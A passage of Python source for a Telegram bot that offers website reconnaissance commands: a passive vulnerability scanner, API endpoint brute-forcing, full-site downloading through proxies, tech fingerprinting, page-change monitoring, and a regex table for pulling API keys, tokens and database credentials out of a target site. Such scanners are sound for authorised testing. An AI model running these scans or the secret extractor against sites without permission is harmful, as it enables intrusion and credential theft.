    if r["missing_headers"]:
        lines.append("*📋 Security Header Issues:*")
        for name, hdr, sev in r["missing_headers"][:8]:
            em = _SEV_EMOJI.get(sev,"⚪")
            if "leak" in name.lower() or "disclosure" in name.lower():
                lines.append(f"  {em} {name}: `{hdr}`")
            else:
                lines.append(f"  {em} Missing *{name}*")
        lines.append("")

    # Cloudflare note
    if r.get("cloudflare"):
        lines += [
            "☁️ *Cloudflare note:*",
            "  Some paths may be hidden behind CF WAF.",
            "  403 results may indicate file exists but CF blocks it.",
            "",
        ]

    lines += ["━━━━━━━━━━━━━━━━━━",
              "⚠️ _Passive scan only — no exploitation_"]
    return "\n".join(lines)


async def cmd_vuln(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/vuln <url> — Passive vuln scanner with CF-aware subdomain discovery."""
    if not context.args:
        await update.effective_message.reply_text(
            "🛡️ *Vulnerability Scanner v4*\n\n"
            "Usage: `/vuln <url>`\n\n"
            "Features:\n"
            "• 📡 Subdomain discovery (DNS verified)\n"
            "• ☁️ Cloudflare detection + slow-mode\n"
            "• 🔍 Catch-all false-positive filter\n"
            "• 🔑 Config / credential leaks\n"
            "• 📁 Git / backup / DB dumps\n"
            "• 🔐 Admin panel detection\n"
            "• 🔗 Full clickable URLs\n\n"
            "_Passive only — no exploitation_",
            parse_mode='Markdown'
        )
        return

    url = context.args[0]
    if not url.startswith('http'):
        url = 'https://' + url

    uid = update.effective_user.id
    allowed, wait_sec = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(
            f"⏱️ `{wait_sec}` seconds စောင့်ပါ",
            parse_mode='Markdown'); return

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(
            f"🚫 `{reason}`", parse_mode='Markdown'); return

    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🛡️ *Vuln Scan v4*\n🌐 `{domain}`\n\n"
        f"• Baseline & catch-all detection\n"
        f"• Subdomain discovery\n"
        f"• Path scanning\n\n_ခဏစောင့်ပါ..._",
        parse_mode='Markdown'
    )

    progress_q: list = []

    async def _prog_loop():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🛡️ *Scanning `{domain}`*\n\n{txt}",
                        parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog_loop())
    try:
        results = await asyncio.to_thread(_vuln_scan_sync, url, progress_q)
    except Exception as e:
        prog.cancel()
        await msg.edit_text(
            f"❌ Scan error: `{type(e).__name__}: {str(e)[:80]}`",
            parse_mode='Markdown'); return
    finally:
        prog.cancel()

    report = _format_vuln_report(results)
    try:
        if len(report) <= 4000:
            await msg.edit_text(report, parse_mode='Markdown')
        else:
            await msg.edit_text(report[:4000] + "\n_...continued_", parse_mode='Markdown')
            await update.effective_message.reply_text(report[4000:], parse_mode='Markdown')
    except Exception:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🔌  /api — API ENDPOINT DISCOVERY COMMAND
# ══════════════════════════════════════════════════

async def cmd_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/api <url> — Discover API endpoints, RSS feeds, hidden paths"""
    uid = update.effective_user.id
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/api https://example.com`\n\n"
            "🔍 *Discovery Method 4 ခု:*\n"
            "① HTML source mining _(data-attrs, inline JS)_\n"
            "② JS bundle mining _(fetch/axios/url patterns)_\n"
            "③ robots.txt / sitemap scan\n"
            f"④ `{len(ALL_API_PATHS)}` known paths brute-force\n\n"
            "🔌 *ရှာပေးသောအမျိုးအစားများ:*\n"
            "• REST API (v1/v2/v3)\n"
            "• GraphQL endpoints\n"
            "• WordPress / WooCommerce / Shopify\n"
            "• Auth (JWT, OAuth, Sanctum)\n"
            "• Admin / Dashboard APIs\n"
            "• Mobile / SaaS / Fintech APIs\n"
            "• Swagger / OpenAPI docs\n"
            "• RSS/Atom feeds\n"
            "• CORS detection\n\n"
            "📦 *Result ကို JSON file နဲ့ download ပေးမယ်*",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text("`%ds` စောင့်ပါ" % wait, parse_mode="Markdown")
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).netloc
    msg    = await update.effective_message.reply_text(
        f"🔌 *API Discovery — `{domain}`*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔍 Phase 1: HTML source mining...\n"
        f"📦 Phase 2: JS bundle mining...\n"
        f"🤖 Phase 3: robots.txt scan...\n"
        f"🔌 Phase 4: `{len(ALL_API_PATHS)}` paths brute-force...\n\n"
        f"⏳ ခဏစောင့်ပါ...",
        parse_mode='Markdown'
    )

    progress_q: list = []

    async def _prog_loop():
        while True:
            await asyncio.sleep(4)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🔌 *Scanning `{domain}`*\n\n{txt}",
                        parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog_loop())
    try:
        found = await asyncio.to_thread(
            discover_api_endpoints, url, lambda t: progress_q.append(t)
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    result    = found   # found is now a dict
    endpoints = result.get("found", [])
    js_mined  = result.get("js_mined", [])
    html_mined= result.get("html_mined", [])
    robots    = result.get("robots", [])
    stats     = result.get("stats", {})

    # ── Summary message ───────────────────────────
    json_apis = [e for e in endpoints if e["type"] in ("JSON_API", "GRAPHQL")]
    xml_feeds = [e for e in endpoints if e["type"] == "XML/RSS"]
    api_docs  = [e for e in endpoints if e["type"] == "API_DOCS"]
    protected = [e for e in endpoints if e["type"] == "PROTECTED"]
    others    = [e for e in endpoints if e["type"] == "OTHER"]
    cors_list = [e for e in endpoints if e.get("cors")]

    all_mined = list(set(js_mined + html_mined + robots))

    if not endpoints and not all_mined:
        await msg.edit_text(
            f"🔌 *API Discovery — `{domain}`*\n\n"
            f"📭 API endpoints မတွေ့ပါ\n"
            f"_(protected or non-standard paths ဖြစ်နိုင်)_\n\n"
            f"🔍 Probed: `{stats.get('total_probed',0)}` paths",
            parse_mode='Markdown'
        )
        return

    report_lines = [
        f"🔌 *API Discovery — `{domain}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"📊 Endpoints: `{len(endpoints)}` | 🔍 Probed: `{stats.get('total_probed',0)}`",
        f"📦 JS mined: `{stats.get('js_urls_found',0)}` | 🌐 HTML mined: `{stats.get('html_urls_found',0)}`",
        "",
    ]

    if json_apis:
        report_lines.append(f"*✅ JSON / GraphQL APIs ({len(json_apis)}):*")
        for e in json_apis[:20]:
            path = urlparse(e["url"]).path or e["url"]
            tag  = " 〔GraphQL〕" if e["type"] == "GRAPHQL" else ""
            cors = " ✦CORS" if e.get("cors") else ""
            prev = e.get("preview","")[:60].replace("\n"," ")
            report_lines.append(f"  🟢 `{path}`{tag}{cors}")
            if prev: report_lines.append(f"     _{prev}_")
        report_lines.append("")

    if xml_feeds:
        report_lines.append(f"*📰 RSS / XML Feeds ({len(xml_feeds)}):*")
        for e in xml_feeds[:10]:
            path = urlparse(e["url"]).path or e["url"]
            report_lines.append(f"  📡 `{path}`")
        report_lines.append("")

    if api_docs:
        report_lines.append(f"*📖 API Docs / Swagger ({len(api_docs)}):*")
        for e in api_docs[:5]:
            path = urlparse(e["url"]).path or e["url"]
            report_lines.append(f"  📘 `{path}`")
        report_lines.append("")

    if protected:
        report_lines.append(f"*🔒 Protected — Exists ({len(protected)}):*")
        for e in protected[:10]:
            path = urlparse(e["url"]).path or e["url"]
            note = f" [{e.get('note',e['status'])}]"
            cors = " ✦CORS" if e.get("cors") else ""
            report_lines.append(f"  🔐 `{path}`{note}{cors}")
        report_lines.append("")

    if all_mined:
        unique_mined = sorted(set(
            urlparse(u).path for u in all_mined if urlparse(u).path
        ))[:20]
        report_lines.append(f"*🕵️ Mined from JS/HTML ({len(all_mined)} total):*")
        for p in unique_mined:
            report_lines.append(f"  🔎 `{p}`")
        report_lines.append("")

    if others:
        report_lines.append(f"*📄 Other ({len(others)}):*")
        for e in others[:5]:
            path = urlparse(e["url"]).path or e["url"]
            report_lines.append(f"  📋 `{path}`")
        report_lines.append("")

    if cors_list:
        report_lines.append(f"*🌍 CORS Enabled ({len(cors_list)}):*")
        for e in cors_list[:5]:
            path = urlparse(e["url"]).path
            report_lines.append(f"  🌐 `{path}` → `{e['cors']}`")
        report_lines.append("")

    report_lines.append("⚠️ _Passive scan only — no exploitation_")

    report_text = "\n".join(report_lines)

    # ── Send text report ──────────────────────────
    try:
        if len(report_text) <= 4000:
            await msg.edit_text(report_text, parse_mode='Markdown')
        else:
            await msg.edit_text(report_text[:4000], parse_mode='Markdown')
            await update.effective_message.reply_text(
                report_text[4000:8000], parse_mode='Markdown')
    except Exception:
        await update.effective_message.reply_text(
            report_text[:4000], parse_mode='Markdown')

    # ── Export full JSON report + send as file ────
    if endpoints or all_mined:
        try:
            safe_domain = re.sub(r'[^\w\-]', '_', domain)
            ts          = datetime.now().strftime("%Y%m%d_%H%M%S")
            json_path   = os.path.join(DOWNLOAD_DIR, f"api_{safe_domain}_{ts}.json")

            export_data = {
                "domain":     domain,
                "scanned_at": datetime.now().isoformat(),
                "stats":      stats,
                "endpoints": [{
                    "url":     e["url"],
                    "type":    e["type"],
                    "status":  e["status"],
                    "cors":    e.get("cors"),
                    "preview": e.get("preview","")[:200],
                    "size_b":  e.get("size_b",0),
                } for e in endpoints],
                "js_mined":   list(set(js_mined)),
                "html_mined": list(set(html_mined)),
                "robots":     robots,
            }

            with open(json_path, 'w', encoding='utf-8') as jf:
                json.dump(export_data, jf, ensure_ascii=False, indent=2)

            cap = (
                f"📦 *API Report — `{domain}`*\n"
                f"✅ `{len(endpoints)}` endpoints | 🕵️ `{len(all_mined)}` mined\n"
                f"🗓 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            )
            with open(json_path, 'rb') as jf:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=jf,
                    filename=f"api_{safe_domain}_{ts}.json",
                    caption=cap,
                    parse_mode='Markdown'
                )
            os.remove(json_path)
        except Exception as e:
            logger.warning("API JSON export error: %s", e)




def download_website(
    base_url: str,
    full_site: bool,
    use_js: bool,
    max_pages: int,
    max_assets: int,
    progress_cb=None,
    resume: bool = False,
) -> tuple:

    domain     = urlparse(base_url).netloc
    safe       = re.sub(r'[^\w\-]','_', domain)
    domain_dir = os.path.join(DOWNLOAD_DIR, safe)
    os.makedirs(domain_dir, exist_ok=True)

    state       = load_resume(base_url) if resume else {"visited":[],"downloaded":[],"assets":[],"stats":{}}
    visited     = set(state["visited"])
    dl_done     = set(state["downloaded"])
    known_assets= set(state["assets"])
    stats = state.get("stats") or {'pages':0,'assets':0,'failed':0,'size_kb':0}

    session = requests.Session()
    session.headers.update(_get_headers())

    # ── Attach proxy to session if available ──────
    _px = proxy_manager.get_proxy()
    if _px:
        session.proxies.update(_px)

    # ── Phase 0: Sitemap discovery ───────────────
    queue: list = [base_url]   # ← FIX: initialize before sitemap section
    if full_site and not resume:
        if progress_cb: progress_cb("🗺️ Sitemap ရှာနေပါတယ်...")
        sitemap_urls = fetch_sitemap(base_url)
        if sitemap_urls:
            stats['sitemap_urls'] = len(sitemap_urls)
            if progress_cb:
                progress_cb("🗺️ Sitemap: `%d` URLs တွေ့ပြီ" % len(sitemap_urls))
            for u in list(sitemap_urls)[:max_pages]:
                if u not in visited and u not in queue:
                    queue.append(u)

    # ── Phase 1: Pages ──────────────────────────
    queue = list(dict.fromkeys(queue))
    queue = [u for u in queue if u not in visited]

    while queue and len(visited) < max_pages:
        url = queue.pop(0)
        if url in visited: continue

        # SSRF check per link
        safe_ok, reason = is_safe_url(url)
        if not safe_ok:
            log_warn(url, f"SSRF blocked: {reason}")
            stats['failed'] += 1
            visited.add(url)
            continue

        visited.add(url)
        html, js_used = fetch_page(url, use_js)
        if html is None:
            stats['failed'] += 1
            continue

        local = safe_local_path(domain_dir, url)
        try:
            with open(local,'w',encoding='utf-8',errors='replace') as f:
                f.write(html)
            stats['pages'] += 1
        except Exception:
            stats['failed'] += 1
            continue

        known_assets |= extract_assets(html, url)
        if full_site:
            for link in get_internal_links(html, url):
                if link not in visited:
                    queue.append(link)

        if stats['pages'] % 5 == 0:
            save_resume(base_url, {"visited":list(visited),"downloaded":list(dl_done),
                                   "assets":list(known_assets),"stats":stats})
        if progress_cb:
            bar = pbar(stats['pages'], max(len(visited), 1))
            progress_cb(
                f"📄 *Pages*\n`{bar}`\n"
                f"`{stats['pages']}` pages | `{len(known_assets)}` assets"
                + (" ⚡JS" if js_used else "")
            )

    # ── Phase 2: Assets ─────────────────────────
    asset_list   = [a for a in list(known_assets)[:max_assets] if a not in dl_done]
    total_assets = len(asset_list) + len(dl_done)
    extra_css    = set()
    max_bytes    = MAX_ASSET_MB * 1024 * 1024

    for i, asset_url in enumerate(asset_list):
        dl_done.add(asset_url)

        # SSRF check per asset
        safe_ok, reason = is_safe_url(asset_url)
        if not safe_ok:
            log_warn(asset_url, f"Asset SSRF blocked: {reason}")
            stats['failed'] += 1
            continue

        try:
            resp = session.get(asset_url, timeout=TIMEOUT, stream=True)
            resp.raise_for_status()

            # ── File size limit (DoS prevention) ──
            cl = resp.headers.get('Content-Length')
            if cl and int(cl) > max_bytes:
                log_warn(asset_url, f"Asset too large: {int(cl)//1024//1024}MB — skipped")
                stats['failed'] += 1
                continue

            content      = b''
            size_exceeded = False
            for chunk in resp.iter_content(8192):
                content += chunk
                if len(content) > max_bytes:
                    size_exceeded = True
                    break
            if size_exceeded:
                log_warn(asset_url, "Asset size limit exceeded mid-stream — skipped")
                stats['failed'] += 1
                continue

            local = safe_local_path(domain_dir, asset_url)
            with open(local,'wb') as f: f.write(content)
            stats['assets'] += 1
            stats['size_kb'] += len(content)/1024

            ct = resp.headers.get('Content-Type','')
            if 'css' in ct or asset_url.lower().endswith('.css'):
                extra_css |= extract_css_assets(content.decode('utf-8','replace'), asset_url)
            # ── Mine JS bundles for media URLs ────
            if 'javascript' in ct or asset_url.lower().endswith('.js'):
                js_media = extract_media_from_js(content.decode('utf-8','replace'), base_url)
                known_assets |= js_media

        except Exception as e:
            stats['failed'] += 1

        if i % 30 == 0:
            save_resume(base_url, {"visited":list(visited),"downloaded":list(dl_done),
                                   "assets":list(known_assets),"stats":stats})
        if progress_cb and i % 10 == 0:
            bar = pbar(len(dl_done), total_assets)
            progress_cb(
                f"📦 *Assets*\n`{bar}`\n"
                f"`{stats['assets']}` done | `{stats['size_kb']/1024:.1f}` MB"
            )

    # ── Phase 3: CSS nested assets ──────────────
    for asset_url in list(extra_css - dl_done)[:200]:
        safe_ok, _ = is_safe_url(asset_url)
        if not safe_ok: continue
        try:
            resp    = session.get(asset_url, timeout=TIMEOUT, stream=True)
            resp.raise_for_status()
            content = b''.join(resp.iter_content(8192))
            if len(content) > max_bytes: continue
            local   = safe_local_path(domain_dir, asset_url)
            with open(local,'wb') as f: f.write(content)
            stats['assets']  += 1
            stats['size_kb'] += len(content)/1024
        except Exception:
            stats['failed'] += 1

    # ── Phase 4: ZIP ─────────────────────────────
    if progress_cb: progress_cb("🗜️ ZIP ထုပ်နေပါတယ်...")

    zip_path = os.path.join(DOWNLOAD_DIR, f"{safe}.zip")
    with zipfile.ZipFile(zip_path,'w',zipfile.ZIP_DEFLATED) as zf:
        for root,dirs,files in os.walk(domain_dir):
            for file in files:
                fp = os.path.join(root,file)
                zf.write(fp, os.path.relpath(fp, DOWNLOAD_DIR))

    shutil.rmtree(domain_dir, ignore_errors=True)
    clear_resume(base_url)

    size_mb = os.path.getsize(zip_path)/1024/1024

    if needs_split(zip_path):
        if progress_cb: progress_cb(f"✂️ {size_mb:.1f}MB split လုပ်နေပါတယ်...")
        parts = split_zip(zip_path)
        os.remove(zip_path)
        return parts, None, stats, size_mb
    return [zip_path], None, stats, size_mb


# ══════════════════════════════════════════════════
# 🔬  FEATURE 1 — /tech  Tech Stack Fingerprinter
# ══════════════════════════════════════════════════

_TECH_SIGNATURES = {
    # CMS
    "WordPress":        [r'wp-content/', r'wp-includes/', r'wordpress'],
    "Drupal":           [r'Drupal\.settings', r'/sites/default/files/'],
    "Joomla":           [r'/media/joomla_', r'Joomla!'],
    "Ghost CMS":        [r'ghost\.io', r'/ghost/api/'],
    "Shopify":          [r'cdn\.shopify\.com', r'Shopify\.theme'],
    # JS Frameworks
    "Next.js":          [r'__NEXT_DATA__', r'/_next/static/'],
    "Nuxt.js":          [r'__NUXT__', r'/_nuxt/'],
    "React":            [r'__reactFiber', r'react-dom\.production'],
    "Vue.js":           [r'__vue__', r'data-v-[a-f0-9]+'],
    "Angular":          [r'ng-version=', r'angular\.min\.js'],
    "Svelte":           [r'__svelte', r'svelte-'],
    # Servers
    "Nginx":            [r'server:\s*nginx'],
    "Apache":           [r'server:\s*apache'],
    "Caddy":            [r'server:\s*caddy'],
    "LiteSpeed":        [r'server:\s*litespeed'],
    "IIS":              [r'server:\s*microsoft-iis'],
    # CDN / WAF
    "Cloudflare":       [r'cf-ray', r'server:\s*cloudflare'],
    "Akamai":           [r'x-akamai-request-id', r'akamai\.net'],
    "Fastly":           [r'x-fastly-request-id', r'fastly\.net'],
    "AWS CloudFront":   [r'x-amz-cf-id', r'cloudfront\.net'],
    # Analytics / Tag
    "Google Analytics": [r'google-analytics\.com/analytics\.js', r'gtag\('],
    "Google Tag Manager":[r'googletagmanager\.com/gtm\.js', r'GTM-[A-Z0-9]+'],
    "Hotjar":           [r'hotjar\.com', r'hj\(\'create\''],
    # Libraries
    "jQuery":           [r'jquery\.min\.js', r'jquery-[0-9]'],
    "Bootstrap":        [r'bootstrap\.min\.css', r'bootstrap\.min\.js'],
    "Tailwind":         [r'tailwindcss', r'class="[^"]*(?:flex|grid|text-[a-z]+-[0-9])'],
    # Backend
    "PHP":              [r'x-powered-by:\s*php', r'\.php'],
    "Laravel":          [r'laravel_session', r'x-powered-by:\s*php.*laravel'],
    "Django":           [r'csrfmiddlewaretoken', r'django'],
    "Rails":            [r'x-powered-by:\s*phusion passenger', r'_rails_'],
    "ASP.NET":          [r'x-powered-by:\s*asp\.net', r'__viewstate'],
    # DB / Backend hints
    "WordPress (WooCommerce)": [r'woocommerce', r'wc-api/'],
    "Stripe":           [r'stripe\.com/v3', r'Stripe\('],
    "Firebase":         [r'firebaseapp\.com', r'firebase\.initializeApp'],
    "Supabase":         [r'supabase\.co', r'supabaseClient'],
}

_NOTABLE_HEADERS = [
    'server', 'x-powered-by', 'x-generator', 'x-framework',
    'cf-ray', 'via', 'x-drupal-cache', 'x-varnish',
    'x-shopify-stage', 'x-wix-request-id',
]

async def cmd_tech(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/tech <url> — Detect technology stack"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/tech https://example.com`\n\n"
            "🔬 *Detects:*  CMS, JS frameworks, servers, CDN/WAF,\n"
            "analytics, backend tech, JS libraries & more.\n\n"
            f"Checks `{len(_TECH_SIGNATURES)}` known tech signatures.",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    msg = await update.effective_message.reply_text("🔬 Tech stack fingerprinting...")

    def _do_tech_scan():
        resp = requests.get(
            url, headers=_get_headers(), timeout=TIMEOUT, verify=False,
            proxies=proxy_manager.get_proxy(), allow_redirects=True
        )
        body         = resp.text[:80000]
        headers_str  = "\n".join(f"{k}: {v}" for k, v in resp.headers.items()).lower()
        combined     = (body + headers_str).lower()

        detected = {}
        for tech, patterns in _TECH_SIGNATURES.items():
            for p in patterns:
                if re.search(p, combined, re.I):
                    detected[tech] = p
                    break

        notable = {
            k: v for k, v in resp.headers.items()
            if k.lower() in _NOTABLE_HEADERS
        }
        return detected, notable, resp.status_code

    try:
        detected, notable, status = await asyncio.to_thread(_do_tech_scan)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return

    domain = urlparse(url).hostname
    lines  = [f"🔬 *Tech Stack — `{domain}`*", f"Status: `{status}`\n"]

    # Group by category
    _CAT = {
        "CMS":        ["WordPress","Drupal","Joomla","Ghost CMS","Shopify","WordPress (WooCommerce)"],
        "JS Frameworks":["Next.js","Nuxt.js","React","Vue.js","Angular","Svelte"],
        "JS Libraries": ["jQuery","Bootstrap","Tailwind"],
        "Server":     ["Nginx","Apache","Caddy","LiteSpeed","IIS"],
        "CDN / WAF":  ["Cloudflare","Akamai","Fastly","AWS CloudFront"],
        "Analytics":  ["Google Analytics","Google Tag Manager","Hotjar"],
        "Backend":    ["PHP","Laravel","Django","Rails","ASP.NET"],
        "Services":   ["Stripe","Firebase","Supabase"],
    }

    any_found = False
    for cat, techs in _CAT.items():
        hits = [t for t in techs if t in detected]
        if hits:
            lines.append(f"*{cat}:*")
            for h in hits:
                lines.append(f"  ✅ `{h}`")
            lines.append("")
            any_found = True

    # Uncategorised
    known_all = {t for ts in _CAT.values() for t in ts}
    extras    = [t for t in detected if t not in known_all]
    if extras:
        lines.append("*Other:*")
        for t in extras:
            lines.append(f"  ✅ `{t}`")
        lines.append("")
        any_found = True

    if not any_found:
        lines.append("⚠️ No known tech signatures matched.")

    if notable:
        lines.append("*📋 Notable Headers:*")
        for k, v in list(notable.items())[:8]:
            lines.append(f"  `{k}: {v[:60]}`")

    await msg.edit_text("\n".join(lines), parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🔔  FEATURE 3 — /monitor  Change Detection & Alerting
# ══════════════════════════════════════════════════
# DB structure: db["monitors"][str(uid)] = [{"url":..,"interval_min":..,"last_hash":..,"last_check":..,"label":..}]

_monitor_app_ref = None   # set in main() to access app.bot

async def monitor_loop():
    """Background task — check monitored URLs for content changes every 60s."""
    global _monitor_app_ref
    while True:
        try:
            await asyncio.sleep(60)
            async with db_lock:
                db = _load_db_sync()

            changed_alerts = []  # (uid, entry, new_hash)
            now = time.time()

            for uid_str, monitors in db.get("monitors", {}).items():
                for entry in monitors:
                    interval_sec = entry.get("interval_min", 30) * 60
                    if now - entry.get("last_check", 0) < interval_sec:
                        continue
                    try:
                        resp      = requests.get(
                            entry["url"], headers=_get_headers(),
                            timeout=TIMEOUT, verify=False,
                            proxies=proxy_manager.get_proxy()
                        )
                        new_hash  = hashlib.sha256(resp.text.encode()).hexdigest()
                        old_hash  = entry.get("last_hash", "")
                        entry["last_check"] = now

                        if old_hash and old_hash != new_hash:
                            changed_alerts.append((uid_str, entry, new_hash, resp.status_code))
                        entry["last_hash"] = new_hash
                    except Exception as ex:
                        logger.debug("Monitor check error %s: %s", entry.get("url"), ex)

            async with db_lock:
                _save_db_sync(db)

            # Fire alerts
            if _monitor_app_ref and changed_alerts:
                for uid_str, entry, new_hash, status in changed_alerts:
                    try:
                        label = entry.get("label") or entry["url"][:40]
                        await _monitor_app_ref.bot.send_message(
                            chat_id=int(uid_str),
                            text=(
                                f"🔔 *Page Changed!*\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"🏷 *{label}*\n"
                                f"🔗 `{entry['url'][:60]}`\n"
                                f"📡 Status: `{status}`\n"
                                f"🕑 {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
                                f"Old: `{entry.get('last_hash','?')[:16]}…`\n"
                                f"New: `{new_hash[:16]}…`\n\n"
                                f"_Use /monitor list to manage alerts_"
                            ),
                            parse_mode='Markdown'
                        )
                    except Exception as e:
                        logger.warning("Monitor alert send error: %s", e)

        except Exception as e:
            logger.error("Monitor loop error: %s", e)
            await asyncio.sleep(30)


async def cmd_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/monitor add <url> [interval_min] [label] | list | del <n> | clear"""
    uid  = str(update.effective_user.id)
    args = context.args or []
    sub  = args[0].lower() if args else ""

    if not sub or sub == "help":
        await update.effective_message.reply_text(
            "🔔 *Page Monitor — Usage*\n\n"
            "`/monitor add <url> [interval] [label]`\n"
            "  └ interval = minutes (default 30, min 5)\n"
            "  └ label = custom name (optional)\n\n"
            "`/monitor list` — View all monitors\n"
            "`/monitor del <n>` — Remove by number\n"
            "`/monitor clear` — Remove all\n\n"
            "📣 Bot ကို alert ပို့ပေးမယ် page ပြောင်းတိုင်း",
            parse_mode='Markdown'
        )
        return

    async with db_lock:
        db = _load_db_sync()
        if "monitors" not in db:
            db["monitors"] = {}
        monitors = db["monitors"].setdefault(uid, [])

        if sub == "add":
            if len(args) < 2:
                await update.effective_message.reply_text("Usage: `/monitor add <url> [interval_min] [label]`", parse_mode='Markdown')
                _save_db_sync(db)
                return
            url   = args[1].strip()
            if not url.startswith('http'):
                url = 'https://' + url
            safe_ok, reason = is_safe_url(url)
            if not safe_ok:
                await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
                _save_db_sync(db)
                return
            interval = max(5, int(args[2])) if len(args) > 2 and args[2].isdigit() else 30
            label    = " ".join(args[3:])[:40] if len(args) > 3 else urlparse(url).hostname
            if len(monitors) >= 10:
                await update.effective_message.reply_text("⚠️ Max 10 monitors per user.", parse_mode='Markdown')
                _save_db_sync(db)
                return
            monitors.append({
                "url": url, "label": label,
                "interval_min": interval,
                "last_hash": "", "last_check": 0,
                "added": datetime.now().strftime("%Y-%m-%d %H:%M")
            })
            _save_db_sync(db)
            await update.effective_message.reply_text(
                f"✅ *Monitor Added*\n"
                f"🏷 `{label}`\n🔗 `{url[:60]}`\n⏱ Every `{interval}` min",
                parse_mode='Markdown'
            )

        elif sub == "list":
            _save_db_sync(db)
            if not monitors:
                await update.effective_message.reply_text("📭 No monitors set up yet.")
                return
            lines = ["🔔 *Your Monitors*\n"]
            for i, m in enumerate(monitors, 1):
                lines.append(
                    f"*{i}.* `{m.get('label', m['url'][:30])}`\n"
                    f"   🔗 `{m['url'][:50]}`\n"
                    f"   ⏱ Every `{m['interval_min']}` min | Added `{m.get('added','?')}`"
                )
            await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')

        elif sub == "del":
            idx = int(args[1]) - 1 if len(args) > 1 and args[1].isdigit() else -1
            if 0 <= idx < len(monitors):
                removed = monitors.pop(idx)
                _save_db_sync(db)
                await update.effective_message.reply_text(
                    f"🗑 Removed: `{removed.get('label', removed['url'][:40])}`",
                    parse_mode='Markdown'
                )
            else:
                _save_db_sync(db)
                await update.effective_message.reply_text("❌ Invalid number. Use `/monitor list` to see indexes.", parse_mode='Markdown')

        elif sub == "clear":
            monitors.clear()
            _save_db_sync(db)
            await update.effective_message.reply_text("🗑 All monitors cleared.")

        else:
            _save_db_sync(db)
            await update.effective_message.reply_text("❓ Unknown subcommand. Use `/monitor help`", parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🔑  FEATURE 7 — /extract  Secret & Sensitive Data Extractor
# ══════════════════════════════════════════════════

_SECRET_PATTERNS = {
    "AWS Access Key":    (r'AKIA[0-9A-Z]{16}',                              "🔴"),
    "AWS Secret":        (r'(?i)aws.{0,20}secret.{0,20}[0-9a-zA-Z/+]{40}', "🔴"),
    "Stripe Secret":     (r'sk_live_[0-9a-zA-Z]{24,}',                     "🔴"),
    "Stripe Public":     (r'pk_live_[0-9a-zA-Z]{24,}',                     "🟡"),
    "JWT Token":         (r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}', "🔴"),
    "Google API Key":    (r'AIza[0-9A-Za-z_-]{35}',                        "🔴"),
    "Firebase Config":   (r'"apiKey"\s*:\s*"AIza[0-9A-Za-z_-]{35}"',       "🔴"),
    "Private Key Block": (r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',      "🔴"),
    "GitHub Token":      (r'ghp_[0-9a-zA-Z]{36}',                          "🔴"),
    "GitLab Token":      (r'glpat-[0-9a-zA-Z_-]{20}',                      "🔴"),
    "Slack Token":       (r'xox[baprs]-[0-9a-zA-Z\-]+',                    "🔴"),
    "Bearer Token":      (r'(?i)bearer\s+[a-zA-Z0-9_\-\.]{20,}',           "🟠"),
    "Basic Auth Header": (r'(?i)authorization:\s*basic\s+[A-Za-z0-9+/=]{8,}',"🟠"),
    "MongoDB URI":       (r'mongodb(?:\+srv)?://[^\s"\'<>]{10,}',           "🔴"),
    "MySQL DSN":         (r'mysql://[^\s"\'<>]{10,}',                       "🔴"),
    "Generic Password":  (r'(?i)(?:password|passwd|pwd)\s*[=:]\s*["\'][^"\']{8,}["\']', "🟠"),
    "Telegram Token":    (r'\d{8,10}:AA[0-9a-zA-Z_-]{33}',                 "🔴"),
    "Sendgrid Key":      (r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}',    "🔴"),
    "Twilio Key":        (r'SK[0-9a-fA-F]{32}',                             "🟠"),
    "HuggingFace Token": (r'hf_[a-zA-Z]{34}',                              "🟡"),
    "OpenAI Key":        (r'sk-[a-zA-Z0-9]{48}',                           "🔴"),
}

async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
